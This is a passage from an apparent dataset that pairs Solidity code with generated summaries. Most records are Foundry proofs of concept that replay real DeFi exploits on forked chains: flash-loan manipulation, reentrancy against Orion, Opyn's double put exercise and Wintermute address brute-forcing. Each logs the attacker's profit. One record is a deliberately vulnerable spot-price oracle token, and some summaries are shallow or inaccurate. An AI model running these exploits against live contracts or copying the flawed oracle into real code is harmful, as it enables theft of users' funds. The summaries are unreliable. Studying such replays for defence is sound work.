_specificIds[8] = 4510;\n        _specificIds[9] = 6932;\n        _specificIds[10] = 1253;\n        _specificIds[11] = 6760;\n        _specificIds[12] = 9403;\n        _specificIds[13] = 1067;\n        _specificIds[14] = 179;\n        _specificIds[15] = 4017;\n        _specificIds[16] = 7165;\n        _specificIds[17] = 720;\n        _specificIds[18] = 5251;\n        _specificIds[19] = 7425;\n\n        pool.withdrawERC721(address(doodles), _specificIds, address(exp));\n\n        uint256 balance = WETH.balanceOf(address(this));\n\n        WETH.transfer(address(exp), balance);\n\n        return true;\n    } \n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes calldata\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}",
        "summary": "This is a Solidity contract that attempts to exploit flaws in the Doodle NFT market and Balancer flash loans. The `ContractTest` contract creates a flash loan of 1,000 WETH from the Balancer Vault, and uses it to manipulate the Doodle NFT market. The `Lib` contract is a library used by `ContractTest` to carry out the attack. \n\nIn summary, the contract exploits flash loans and NFT market manipulation vulnerabilities to gain significant profits.",
        "id": "c738d073-9f7c-49a4-bd1a-7d6da55935e1"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);\n    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);\n    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    \n    \n    function setUp() public {\n        cheats.createSelectFork(\"fantom\", 34041499);//fork fantom at block 34041499\n        \n    }\n\n    function testExploit() public {\n        emit log_named_uint(\"Before exploit, USDC  balance of attacker:\", usdc.balanceOf(msg.sender));\n     pair.swap(80000000*1e6,0,address(this),new bytes(1));\n        emit log_named_uint(\"After exploit, USDC  balance of attacker:\", usdc.balanceOf(msg.sender));\n}\n    function hook(address sender, uint amount0, uint amount1, bytes calldata data) external{\n        usdc.approve(address(vault),type(uint256).max);\n        vault.depositSafe(amount0,address(usdc),1);\n        vault.withdraw(vault.balanceOf(address(this)),address(usdc));\n        usdc.transfer(msg.sender,(amount0/9999*10000)+10000);\n        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));\n    }\n}\n",
        "summary": "This is a Solidity smart contract that includes several other contracts through their interfaces. The contract has a function to set up the test environment and another function to test an exploit. \n\nThe setUp() function creates a fork of the Fantom blockchain at a particular block (34041499) using the CheatCodes contract.\n\nThe testExploit() function executes a swap of a large amount of tokens on a Uniswap exchange. It then emits two logs showing the balance of USDC tokens owned by the attacker before and after the exploit.\n\nFinally, the hook() function implements a callback method that is called after the swap executes. It approves transferring an unlimited number of USDC tokens to the OneRingVault contract, deposits these tokens into the contract, withdraws them, and transfers the USDC tokens to the attacker and then to the owner of the transaction.",
        "id": "c309e607-6318-4a67-8427-ddcd4840b6a8"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface ProxyFactory {\n  function createProxy(address masterCopy, bytes calldata data)\n    external\n    returns (address payable proxy);\n}\n\ncontract ContractTest is DSTest {\n  ProxyFactory proxy = ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);\n  address public childcontract;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"optimism\", 10607735); //fork optimism at block 10607735\n  }\n\n  function testExploit() public {\n    while (childcontract != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) {\n      childcontract = proxy.createProxy(\n        0xE7145dd6287AE53326347f3A6694fCf2954bcD8A,\n        \"0x\"\n      );\n      emit log_named_address(\"Created Wintermute contract\", childcontract);\n    }\n  }\n}\n",
        "summary": "This code defines a contract `ContractTest` that imports a contract named `Test.sol` and an interface contract. The interface declares a function `createProxy` that takes an address and some data, and returns an address payable. \n\nThe `ContractTest` contract gets an instance of the `ProxyFactory` contract at the address `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`, and a `CheatCodes` instance at the address `0x7109709ECfa91a80626fF3989D68f67F5b1DD12D`. \n\nThe `setUp` function forks `optimism` at block 10607735. The `testExploit` function runs a while loop until it creates a `childcontract` object that satisfies a certain condition, which creates a new `proxy` contract for that child contract and emits an event with the child contract address.",
        "id": "f1c7fc5d-ba81-4f48-93f4-63832a7cee96"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n@Analysis \nhttps://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8\n\n@Transaction\n0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a\n*/\n\ncontract ContractTest is DSTest {\n\n    IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);\n\n    address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n    function setUp() public {\n\n        cheats.createSelectFork(\"mainnet\", 10592516); //fork mainnet at block 10592516\n    }\n\n    function test_attack() public {\n        cheats.startPrank(attacker);\n\n        uint balBefore = usdc.balanceOf(attacker) / 1e6;\n        console.log(\"Attacker USDC balance before is    \", balBefore);\n        console.log(\"------EXPLOIT-----\");\n\n        //Adds ERC20 collateral, and mints new oTokens in one step\n        uint amtToCreate = 300000000;\n        uint amtCollateral = 9900000000;\n        opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);\n\n        //create an arry of vaults\n        address payable[] memory _arr = new address payable[](2) ;\n        _arr[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f);\n        _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);\n\n        //The attacker excercises the put option on two different valuts using the same msg.value \n        opyn.exercise{value: 30 ether}(600000000, _arr);\n\n        //remove share of underlying after excercise\n        opyn.removeUnderlying();\n\n        uint balAfter = usdc.balanceOf(attacker) / 1e6;\n        console.log(\"Attacker USDC balance after is     \", balAfter);\n        console.log(\"Attacker profit is                  \", balAfter - balBefore); \n        \n    }\n  }",
        "summary": "This is a Solidity smart contract that tests an exploit on a protocol called Opyn. The contract imports other contracts/interfaces and defines a series of operations to be executed once the setup is complete. It then defines a test function called \"test_attack\", which executes several actions that allow an attacker (specified by the variable \"attacker\") to exploit a vulnerability in Opyn's system. Finally, the test function outputs before-and-after balance readings to determine the attacker's profit.",
        "id": "20baaef3-1128-4227-88e5-fdb947f2c319"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"openzeppelin-contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/token/ERC20/ERC20.sol\";\n\ncontract oUSD is ERC20{\n    // \u4e3b\u7f51\u5408\u7ea6\n    address public constant FACTORY_V2 =\n        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;\n\n    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);\n    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));\n    IERC20 public weth = IERC20(WETH);\n    IERC20 public busd = IERC20(BUSD);\n\n    constructor() ERC20(\"Oracle USD\",\"oUSD\"){}\n\n    // \u83b7\u53d6ETH price\n    function getPrice() public view returns (uint256 price) {\n        // pair \u4ea4\u6613\u5bf9\u4e2d\u50a8\u5907\n        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();\n        // ETH \u77ac\u65f6\u4ef7\u683c\n        price = reserve0/reserve1;\n    }\n\n    function swap() external payable returns (uint256 amount){\n        // \u83b7\u53d6\u4ef7\u683c\n        uint price = getPrice();\n        // \u8ba1\u7b97\u5151\u6362\u6570\u91cf\n        amount = price * msg.value;\n        // \u94f8\u9020\u4ee3\u5e01\n        _mint(msg.sender, amount);\n    }\n}\n\ninterface IUniswapV2Factory {\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n}\n\ninterface IUniswapV2Pair {\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (\n            uint112 reserve0,\n            uint112 reserve1,\n            uint32 blockTimestampLast\n        );\n\n    function price0CumulativeLast() external view returns (uint);\n\n    function price1CumulativeLast() external view returns (uint);\n\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address owner) external view returns (uint);\n}\n\ninterface IUniswapV2Router {\n    //  swap\u76f8\u5173\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n\n    //  \u6d41\u52a8\u6027\u76f8\u5173\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    )\n        external\n        returns (\n            uint amountA,\n            uint amountB,\n            uint liquidity\n        );\n\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n\n    function factory() external view returns (address);\n}",
        "summary": "This code defines a Solidity smart contract called oUSD. It imports two contracts from the OpenZeppelin library and defines an interface for the Uniswap contract. The oUSD contract mints a new token called oUSD, and has a function called getPrice() that returns the price of ETH in BUSD. It also has a swap() function that allows users to exchange ETH for oUSD tokens by calling the getPrice() function and calculating the amount of oUSD to be minted based on the price of ETH and the amount of ETH sent to the contract.",
        "id": "ab7ba604-a83f-44f0-aa15-45da31b639d5"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma abicoder v2;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"./RecordInterface.sol\";\nimport \"./RestStorage.sol\";\nimport \"./UserStorage.sol\";\nimport \"./RecordStorage.sol\";\nimport \"./AppealStorage.sol\";\n\ncontract OrderStorage is Ownable {\n    RestStorage private _restStorage;\n    RecordInterface private _recordStorage;\n    UserInterface private _userStorage;\n    AppealInterface private _appealS;\n    address recordAddress;\n\n    struct Order {\n        address userAddr;\n        uint256 orderNo;\n        uint256 restNo;\n        uint256 coinCount;\n        uint256 orderAmount;\n        uint256 payType;\n        string currencyType;\n        uint256 orderType;\n        uint256 orderStatus;\n        OrderDetail orderDetail;\n    }\n    struct OrderDetail {\n        address buyerAddr;\n        address sellerAddr;\n        string coinType;\n        uint256 price;\n        uint256 tradeTime;\n        uint256 updateTime;\n        string tradeHash;\n        uint256 tradeFee;\n    }\n\n    mapping(uint256 => Order) private orders;\n    mapping(uint256 => uint256) private orderIndex;\n\n    Order[] private orderList;\n\n    mapping(address => mapping(uint256 => uint256)) orderFrozenTotal;\n\n    uint256 cancelOrderTime = 30;\n\n    function setCancelOrderTime(uint256 _count) public onlyOwner {\n        cancelOrderTime = _count;\n    }\n\n    function getCancelOrderTime() public view returns (uint256) {\n        return cancelOrderTime;\n    }\n\n    event OrderAdd(\n        uint256 _orderNo,\n        uint256 _restNo,\n        uint256 _coinCount,\n        uint256 _tradeFee,\n        uint256 _orderAmount,\n        uint256 _payType,\n        uint256 _orderType,\n        address _buyerAddr,\n        address _sellerAddr\n    );\n    event OrderUpdateHash(uint256 _orderNo, string _tradeHash);\n    event OrderPaidMoney(uint256 _orderNo);\n    event OrderConfirmCollect(uint256 _orderNo);\n    event OrderCancel(uint256 _orderNo);\n    event OrderUpdateStatus(uint256 _orderNo, uint256 _orderStatus);\n\n    constructor(\n        address _recordAddr,\n        address _restAddr,\n        address _userAddr\n    ) {\n        _recordStorage = RecordInterface(_recordAddr);\n        _restStorage = RestStorage(_restAddr);\n        _userStorage = UserInterface(_userAddr);\n        recordAddress = _recordAddr;\n    }\n\n    address _appealCAddr;\n\n    modifier onlyAuthFromAddr() {\n        require(_appealCAddr != address(0), \"Invalid address call order\");\n        _;\n    }\n\n    function authFromContract(address _fromAppeal) external {\n        require(_appealCAddr == address(0), \"appeal address has Auth\");\n        _appealCAddr = _fromAppeal;\n        _appealS = AppealInterface(_appealCAddr);\n    }\n\n    modifier onlyBuyer(uint256 _orderNo) {\n        require(_orderNo != uint256(0), \"orderNo null is not allowed\");\n        require(\n            orders[_orderNo].orderDetail.buyerAddr == msg.sender,\n            \"Only buyer can call\"\n        );\n        _;\n    }\n\n    modifier onlySeller(uint256 _orderNo) {\n        require(_orderNo != uint256(0), \"orderNo null is not allowed\");\n        require(\n            orders[_orderNo].orderDetail.sellerAddr == msg.sender,\n            \"Only seller can call\"\n        );\n        _;\n    }\n\n    modifier onlyBuyerOrSeller(uint256 _orderNo) {\n        require(_orderNo != uint256(0), \"orderNo null is not allowed\");\n        require(\n            orders[_orderNo].orderDetail.sellerAddr == msg.sender ||\n                orders[_orderNo].orderDetail.buyerAddr == msg.sender,\n            \"Only buyer or seller can call\"\n        );\n        _;\n    }\n\n    function _checkParam(\n        uint256 _restNo,\n        uint256 _coinCount,\n        uint256 _orderAmount,\n        uint256 _payType\n    ) internal pure {\n        require(\n            _restNo != uint256(0),\n            \"OrderStorage: restNo null is not allowed\"\n        );\n        require(_coinCount > 0, \"OrderStorage: coinCount null is not allowed\");\n        require(\n            _orderAmount > 0,\n            \"OrderStorage: orderAmount null is not allowed\"\n        );\n        require(\n            _payType != uint256(0),\n            \"OrderStorage: payType null is not allowed\"\n        );\n    }\n\n    function _insert(\n        uint256 _restNo,\n        uint256 _coinCount,\n        uint256 _tradeFee,\n        uint256 _orderAmount,\n        uint256 _payType,\n        uint256 _orderType,\n        address _buyerAddr,\n        address _sellerAddr\n    ) internal returns (uint256 restNo) {\n        _checkParam(_restNo, _coinCount, _orderAmount, _payType);\n\n        RestStorage.Rest memory _rest = _restStorage.searchRest(_restNo);\n        require(_rest.userAddr != address(0), \"rest not exist\");\n        OrderDetail memory _orderDetail = OrderDetail({\n            buyerAddr: _buyerAddr,\n            sellerAddr: _sellerAddr,\n            coinType: _rest.coinType,\n            price: _rest.price,\n            tradeTime: block.timestamp,\n            updateTime: 0,\n            tradeHash: \"\",\n            tradeFee: _tradeFee\n        });\n\n        uint256 _orderNo = block.timestamp;\n        Order memory order = Order({\n            userAddr: msg.sender,\n            orderNo: _orderNo,\n            restNo: _restNo,\n            coinCount: _coinCount,\n            orderAmount: _orderAmount,\n            payType: _payType,\n            currencyType: _rest.currencyType,\n            orderType: _orderType,\n            orderStatus: 1,\n            orderDetail: _orderDetail\n        });\n\n        orders[_orderNo] = order;\n\n        orderList.push(order);\n        orderIndex[_orderNo] = orderList.length - 1;\n\n        if (_orderType == 2) {\n            orderFrozenTotal[msg.sender][_orderNo] = _coinCount;\n        } else if (_orderType == 1) {\n            orderFrozenTotal[_rest.userAddr][_orderNo] = _coinCount;\n        }\n\n        emit OrderAdd(\n            _orderNo,\n            _restNo,\n            _coinCount,\n            _tradeFee,\n            _orderAmount,\n            _payType,\n            _orderType,\n            _buyerAddr,\n            _sellerAddr\n        );\n\n        return _orderNo;\n    }\n\n    function addBuyOrder(\n        uint256 _restNo,\n        uint256 _coinCount,\n        uint256 _orderAmount,\n        uint256 _payType\n    ) external {\n        RestStorage.Rest memory _rest = _restStorage.searchRest(_restNo);\n        require(_rest.userAddr != msg.sender, \"rest not exist\");\n        require(_rest.restType == 2, \"sell rest not exist\");\n        require(_coinCount > 0 && _orderAmount > 0, \"coin count error\");\n        require(_rest.restStatus == 1, \"rest status error\");\n        UserStorage.User memory _currentUser = _userStorage.searchUser(\n            msg.sender\n        );\n\n        require(\n            _currentUser.userFlag != 1 && _currentUser.userFlag != 2,\n            \"invalid user\"\n        );\n\n        uint256 _restFrozen = _restStorage.getRestFrozenTotal(\n            _rest.userAddr,\n            _restNo\n        );\n        require(_restFrozen >= _coinCount, \"coin not enough\");\n\n        uint256 _amo = SafeMath.mul(_rest.price, _coinCount);\n        require(\n            _amo >= _rest.restDetail.limitAmountFrom &&\n                _amo <= _rest.restDetail.limitAmountTo,\n            \"amount error\"\n        );\n        require(\n            _currentUser.credit >= _rest.restDetail.limitMinCredit,\n            \"credit error\"\n        );\n        require(\n            _currentUser.morgageStats.mortgage >=\n                _rest.restDetail.limitMinMortgage,\n            \"mortgage error\"\n        );\n\n        _restStorage.updateRestFinishCount(_restNo, _coinCount);\n        _insert(\n            _restNo,\n            _coinCount,\n            0,\n            _orderAmount,\n            _payType,\n            1,\n            msg.sender,\n            _rest.userAddr\n        );\n    }\n\n    function addSellOrder(\n        uint256 _restNo,\n        uint256 _coinCount,\n        uint256 _tradeFee,\n        uint256 _orderAmount,\n        uint256 _payType\n    ) external {\n        RestStorage.Rest memory _rest = _restStorage.searchRest(_restNo);\n        require(_rest.userAddr != msg.sender, \"rest not exist\");\n        require(_rest.restType == 1, \"buy rest not exist\");\n        require(_coinCount > 0 && _tradeFee >= 0, \"coin count error\");\n        require(_orderAmount > 0, \"orderAmount error\");\n        require(_rest.restStatus == 1, \"rest status error\");\n\n        uint256 _amo = SafeMath.mul(_rest.price, _coinCount);\n        require(\n            _amo >= _rest.restDetail.limitAmountFrom &&\n                _amo <= _rest.restDetail.limitAmountTo,\n            \"amount error\"\n        );\n\n        UserStorage.User memory _currentUser = _userStorage.searchUser(\n            msg.sender\n        );\n\n        require(\n            _currentUser.userFlag != 1 && _currentUser.userFlag != 2,\n            \"invalid user\"\n        );\n        require(\n            _currentUser.credit >= _rest.restDetail.limitMinCredit,\n            \"credit error\"\n        );\n        require(\n            _currentUser.morgageStats.mortgage >=\n                _rest.restDetail.limitMinMortgage,\n            \"mortgage error\"\n        );\n\n        uint256 _needSub = SafeMath.add(_coinCount, _tradeFee);\n\n        _restStorage.updateRestFinishCount(_restNo, _coinCount);\n        _insert(\n            _restNo,\n            _coinCount,\n            _tradeFee,\n            _orderAmount,\n            _payType,\n            2,\n            _rest.userAddr,\n            msg.sender\n        );\n\n        TokenTransfer _tokenTransfer = _recordStorage.setERC20Address(\n            _rest.coinType\n        );\n        _tokenTransfer.transferFrom(msg.sender, recordAddress, _needSub);\n        _recordStorage.addRecord(\n            msg.sender,\n            \"\",\n            _rest.coinType,\n            _coinCount,\n            2,\n            1,\n            2\n        );\n    }\n\n    function setPaidMoney(uint256 _orderNo)\n        external\n        onlyBuyer(_orderNo)\n        returns (bool)\n    {\n        _updateOrderStatus(_orderNo, 2);\n        emit OrderPaidMoney(_orderNo);\n        return true;\n    }\n\n    function confirmCollect(uint256 _orderNo) external onlySeller(_orderNo) {\n        require(\n            _orderNo != uint256(0),\n            \"OrderStorage:orderNo null is not allowed\"\n        );\n        Order memory _order = orders[_orderNo];\n        require(_order.orderStatus == 2, \"OrderStorage:Invalid order status\");\n        require(\n            _order.orderDetail.buyerAddr != address(0),\n            \"OrderStorage:Invalid buyer address\"\n        );\n        require(\n            orderFrozenTotal[msg.sender][_orderNo] >= _order.coinCount,\n            \"OrderStorage:coin not enough\"\n        );\n\n        _updateOrderStatus(_orderNo, 3);\n\n        orderFrozenTotal[msg.sender][_orderNo] = 0;\n\n        uint256 _rc = _recordStorage.getTradeCredit();\n        UserStorage.User memory _user = _userStorage.searchUser(msg.sender);\n        uint256 _credit = _user.credit + _rc;\n        UserStorage.TradeStats memory _tradeStats = _user.tradeStats;\n        _tradeStats.tradeTotal += 1;\n        _userStorage.updateTradeStats(msg.sender, _tradeStats, _credit);\n\n        UserStorage.User memory _user2 = _userStorage.searchUser(\n            _order.orderDetail.buyerAddr\n        );\n        uint256 _credit2 = _user2.credit + _rc;\n        UserStorage.TradeStats memory _tradeStats2 = _user2.tradeStats;\n        _tradeStats2.tradeTotal += 1;\n        _userStorage.updateTradeStats(\n            _order.orderDetail.buyerAddr,\n            _tradeStats2,\n            _credit2\n        );\n\n        _recordStorage.subFrozenTotal(_orderNo, _order.orderDetail.buyerAddr);\n\n        emit OrderConfirmCollect(_orderNo);\n    }\n\n    function cancelOrder(uint256 _orderNo)\n        external\n        onlyBuyerOrSeller(_orderNo)\n        returns (bool)\n    {\n        Order memory _order = orders[_orderNo];\n        require(\n            _order.orderNo != uint256(0),\n            \"OrderStorage: current Order not exist\"\n        );\n\n        require(_order.orderStatus == 1, \"Can't cancel order\");\n\n        require(\n            _order.orderDetail.tradeTime + cancelOrderTime * 1 minutes <\n                block.timestamp,\n            \"30 minutes limit\"\n        );\n        RestStorage.Rest memory _rest = _restStorage.searchRest(_order.restNo);\n\n        if (_rest.restStatus == 4 || _rest.restStatus == 5) {\n            orderFrozenTotal[_order.orderDetail.sellerAddr][_orderNo] = 0;\n\n            _recordStorage.addAvailableTotal(\n                _order.orderDetail.sellerAddr,\n                _order.orderDetail.coinType,\n                _order.coinCount\n            );\n        } else {\n            if (_order.orderType == 2) {\n                orderFrozenTotal[_order.orderDetail.sellerAddr][_orderNo] = 0;\n\n                _recordStorage.addAvailableTotal(\n                    _order.orderDetail.sellerAddr,\n                    _order.orderDetail.coinType,\n                    _order.coinCount\n                );\n            }\n\n            _restStorage.addRestRemainCount(_order.restNo, _order.coinCount);\n        }\n        _updateOrderStatus(_orderNo, 4);\n        emit OrderCancel(_orderNo);\n        return true;\n    }\n\n    function takeCoin(uint256 _o) external onlyBuyerOrSeller(_o) {\n        AppealStorage.Appeal memory _appeal = _appealS.searchAppeal(_o);\n        require(\n            block.timestamp - _appeal.detail.witnessHandleTime > 24 hours,\n            \"time error\"\n        );\n\n        address _win;\n\n        if (_appeal.user == _appeal.buyer) {\n            if (_appeal.status == 2) {\n                _win = _appeal.buyer;\n            } else if (_appeal.status == 3) {\n                _win = _appeal.seller;\n            }\n        } else {\n            if (_appeal.status == 2) {\n                _win = _appeal.seller;\n            } else if (_appeal.status == 3) {\n                _win = _appeal.buyer;\n            }\n        }\n        require(_win == msg.sender, \"opt error\");\n\n        _updateOrderStatus(_o, 5);\n        orderFrozenTotal[_appeal.seller][_o] = 0;\n        _recordStorage.subFrozenTotal(_o, msg.sender);\n    }\n\n    function _updateOrderStatus(uint256 _orderNo, uint256 _orderStatus)\n        internal\n        onlyBuyerOrSeller(_orderNo)\n    {\n        Order memory order = orders[_orderNo];\n        require(\n            order.orderNo != uint256(0),\n            \"OrderStorage: current Order not exist\"\n        );\n        require(_orderStatus >= 1 && _orderStatus <= 5, \"Invalid order status\");\n\n        if (_orderStatus == 2 && order.orderStatus != 1) {\n            revert(\"Invalid order status 2\");\n        }\n        if (_orderStatus == 3 && order.orderStatus != 2) {\n            revert(\"Invalid order status 3\");\n        }\n        if (_orderStatus == 4 && order.orderStatus != 1) {\n            revert(\"Invalid order status 4\");\n        }\n        if (\n            _orderStatus == 5 &&\n            order.orderStatus != 1 &&\n            order.orderStatus != 2\n        ) {\n            revert(\"Invalid order status 5\");\n        }\n\n        if (_orderStatus == 2) {\n            require(\n                order.orderDetail.buyerAddr == msg.sender,\n                \"only buyer call\"\n            );\n        }\n        if (_orderStatus == 3) {\n            require(\n                order.orderDetail.sellerAddr == msg.sender,\n                \"only seller call\"\n            );\n        }\n        order.orderStatus = _orderStatus;\n\n        order.orderDetail.updateTime = block.timestamp;\n        orders[_orderNo] = order;\n        orderList[orderIndex[_orderNo]] = order;\n        emit OrderUpdateStatus(_orderNo, _orderStatus);\n    }\n\n    function _search(uint256 _orderNo)\n        internal\n        view\n        returns (Order memory order)\n    {\n        require(\n            _orderNo != uint256(0),\n            \"OrderStorage: orderNo null is not allowed\"\n        );\n        require(\n            orders[_orderNo].orderNo != uint256(0),\n            \"OrderStorage: current Order not exist\"\n        );\n\n        Order memory o = orders[_orderNo];\n        return o;\n    }\n\n    function searchOrder(uint256 _orderNo)\n        external\n        view\n        returns (Order memory order)\n    {\n        return _search(_orderNo);\n    }\n\n    function searchOrderList() external view returns (Order[] memory) {\n        return orderList;\n    }\n\n    function searchMyOrderList() external view returns (Order[] memory) {\n        Order[] memory resultList = new Order[](orderList.length);\n        for (uint256 i = 0; i < orderList.length; i++) {\n            Order memory _order = orderList[i];\n            if (\n                _order.orderDetail.buyerAddr == msg.sender ||\n                _order.orderDetail.sellerAddr == msg.sender\n            ) {\n                resultList[i] = _order;\n            }\n        }\n        return resultList;\n    }\n\n    function searchListByRest(uint256 _restNo)\n        external\n        view\n        returns (Order[] memory)\n    {\n        Order[] memory resultList = new Order[](orderList.length);\n        for (uint256 i = 0; i < orderList.length; i++) {\n            Order memory _order = orderList[i];\n            if (_order.restNo == _restNo) {\n                resultList[i] = _order;\n            }\n        }\n        return resultList;\n    }\n}\n",
        "summary": "This code is a smart contract written in Solidity that manages the storage of orders for a cryptocurrency exchange platform. It allows users to create and manage buy and sell orders for specific cryptocurrencies listed by registered users of the platform. \n\nThe contract includes various modifiers to restrict access to certain functions to only authorized users (e.g. buyer, seller, or both). It also includes events to track the creation, update, and cancellation of orders.\n\nThe contract maintains a list of orders, and provides functions for searching and retrieving specific orders or lists of orders by various criteria (e.g. user address, cryptocurrency type, order status).",
        "id": "8e54f845-42f9-4a45-a515-2f22babecf6d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analsysi\n// https://twitter.com/peckshield/status/1621337925228306433\n// https://twitter.com/BlockSecTeam/status/1621263393054420992\n// https://www.numencyber.com/analysis-of-orionprotocol-reentrancy-attack-with-poc/\n// @TX\n// https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa ETH\n// https://bscscan.com/tx/0xfb153c572e304093023b4f9694ef39135b6ed5b2515453173e81ec02df2e2104 BSC\n\n// similar events\n// https://github.com/SunWeb3Sec/DeFiHackLabs#20221223---defrost---reentrancy\n// https://github.com/SunWeb3Sec/DeFiHackLabs#20221110---dfxfinance---reentrancy\n\ninterface OrionPoolV2Factory {\n    function createPair(address tokenA, address tokenB) external;\n    function getPair(address tokenA, address tokenB) external view returns(address);\n}\ninterface ORION {\n    function swapThroughOrionPool(\n        uint112 amount_spend,\n        uint112 amount_receive,\n        address[] calldata path,\n        bool is_exact_spend\n    ) external;\n    function depositAsset(address assetAddress, uint112 amount) external;\n    function getBalance(address assetAddress, address user) external view returns (int192);\n    function withdraw(address assetAddress, uint112 amount) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);\n    OrionPoolV2Factory Factory = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);\n    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    Uni_Router_V3 RouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);\n    uint256 flashAmount;\n    IERC20 ATK;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_542_147);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(Orion), \"ORION\");\n        vm.label(address(Factory), \"Factory\");\n        vm.label(address(ATK), \"ATK\");\n        vm.label(address(RouterV3), \"RouterV3\");\n        vm.label(address(Pair), \"Pair\");\n    }\n\n    function testExploit() public {\n        deal(address(USDT), address(this), 1e6); // set the USDT balance of exploiter is 1\n        deal(address(USDC), address(this), 1e6); // set the USDC balance of exploiter is 1\n        ATK = new ATKToken(address(this));\n        addLiquidity();\n\n        address(USDT).call(abi.encodeWithSignature(\"approve(address,uint256)\", address(Orion), type(uint256).max));\n        USDC.approve(address(Orion), type(uint256).max);\n        Orion.depositAsset(address(USDC), 500_000);\n\n        flashAmount = USDT.balanceOf(address(Orion));\n        Pair.swap(0, flashAmount, address(this), new bytes(1));\n        USDTToWETH();\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n            );\n    }\n\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        address[] memory path = new address[](3);\n        path[0] = address(USDC);\n        path[1] = address(ATK);\n        path[2] = address(USDT);\n        Orion.swapThroughOrionPool(10_000, 0, path, true);\n        Orion.withdraw(address(USDT), 